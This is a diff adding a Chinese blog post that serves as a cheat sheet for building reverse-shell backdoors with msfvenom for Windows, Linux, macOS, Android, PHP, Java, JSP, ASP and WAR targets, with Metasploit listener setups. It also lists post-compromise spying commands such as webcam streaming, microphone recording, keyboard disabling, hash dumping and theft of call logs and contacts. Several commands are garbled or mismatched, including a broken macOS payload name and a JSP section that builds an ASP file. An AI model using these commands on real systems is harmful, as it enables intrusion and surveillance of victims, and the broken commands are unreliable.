@@ -95,7 +95,7 @@
   <div class="progress-container">
     <div class="progress-bar" id="bar"></div>
   </div>
-  
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-windows%E4%B8%8Bexe%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-text">1.windows下exe执行文件后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-linux%E4%B8%8B%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-text">2.linux下执行文件后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-mac%E5%90%8E%E9%97%A8"><span class="toc-text">3.mac后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-android%E5%90%8E%E9%97%A8"><span class="toc-text">4.android后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%90%8E%E9%97%A8"><span class="toc-text">PHP后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-java%E5%90%8E%E9%97%A8"><span class="toc-text">2.java后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-jsp%E5%90%8E%E9%97%A8"><span class="toc-text">3.jsp后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-asp%E5%90%8E%E9%97%A8"><span class="toc-text">4.asp后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-war%E5%90%8E%E9%97%A8"><span class="toc-text">5.war后门</span></a></li></ol>
 </div>
 
 <div class="post-content" id="post-content">
@@ -113,7 +113,66 @@
     </div>
     <hr>
     
-    
+    <p>可执行脚本反弹shell</p>
+<h1 id="1-windows下exe执行文件后门"><a href="#1-windows下exe执行文件后门" class="headerlink" title="1.windows下exe执行文件后门"></a>1.windows下exe执行文件后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x &gt;文件路径/文件名</span><br><span class="line">案例：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x &gt;/shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>监听设置:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>攻陷后常用查询命令</p>
+<p>ps #查看进程<br>migrate #注入进程<br>run vnc #查看远程桌面</p>
+<p>cat #查看文件<br>edit #编辑文件<br>upload #上传文件<br>download #下载文件<br>rm #删除文件<br>mkdir #创建文件夹<br>rmdir #删除文件夹</p>
+<p>sessions -l #查看会话<br>backgroud #退出当前会话</p>
+<p>enumdesktops #在线用户数<br>uictl disable keyboard #让键盘失效<br>uictl enable keyboard #恢复键盘<br>record_mic -d 10 #音频录制<br>webcam_stream #开启摄像头<br>screenshot #桌面抓图<br>sysinfo #系统信息查询<br>getsystem #获取最高权限<br>hashdump #密码hash</p>
+<h1 id="2-linux下执行文件后门"><a href="#2-linux下执行文件后门" class="headerlink" title="2.linux下执行文件后门"></a>2.linux下执行文件后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x &gt;文件路径/文件名</span><br><span class="line">案例：msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 x &gt;/linux_shell</span><br><span class="line">需要给执行权限 chmod +x linux_shell</span><br><span class="line">监听设置</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-mac后门"><a href="#3-mac后门" class="headerlink" title="3.mac后门"></a>3.mac后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86ell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f macho &gt; 文件路径/文件名</span><br><span class="line">案例：msfvenom -p osx/x86ell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload osx/x86ell_reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-android后门"><a href="#4-android后门" class="headerlink" title="4.android后门"></a>4.android后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 R &gt; 文件路径/文件名</span><br><span class="line">案例：msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 R &gt; shell.apk</span><br><span class="line">手机安装apk文件点击执行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br><span class="line">webpayload</span><br></pre></td></tr></table></figure>
+
+<p>常用命令： search                     #搜索 </p>
+<p>search -f *.jpg download webcam_stream -i 1&#x2F;2       #打开前置或后置摄像头</p>
+<p>check_root                 #检测</p>
+<p>root dump_calllog               #下载电话记录 </p>
+<p>dump_contacts              #下载信息记录 </p>
+<p>geolocate                  #定位，需要下载谷歌地图</p>
+<h1 id="PHP后门"><a href="#PHP后门" class="headerlink" title="PHP后门"></a>PHP后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x&gt;文件路径/文件名</span><br><span class="line">案例：msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x&gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-java后门"><a href="#2-java后门" class="headerlink" title="2.java后门"></a>2.java后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 x &gt;文件路径/文件名</span><br><span class="line">案例：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 x &gt;shell.jar</span><br><span class="line">运行命令：java -jar shell.jar</span><br></pre></td></tr></table></figure>
+
+
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-jsp后门"><a href="#3-jsp后门" class="headerlink" title="3.jsp后门"></a>3.jsp后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f asp &gt; 文件路径/文件名</span><br><span class="line">案例：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-asp后门"><a href="#4-asp后门" class="headerlink" title="4.asp后门"></a>4.asp后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f asp &gt; 文件路径/文件名</span><br><span class="line">案例：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h1 id="5-war后门"><a href="#5-war后门" class="headerlink" title="5.war后门"></a>5.war后门</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=监听端ip地址 LPORT=监听端端口 -f war &gt; shell.war</span><br><span class="line">Scripting Payloads</span><br><span class="line">案例：msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.43.193 LPORT=4444 -f war &gt; shell.war</span><br><span class="line">Scripting Payloads</span><br></pre></td></tr></table></figure>
+
+<p>监听设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.193</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
     
     <hr>
     <div class="content-tags">
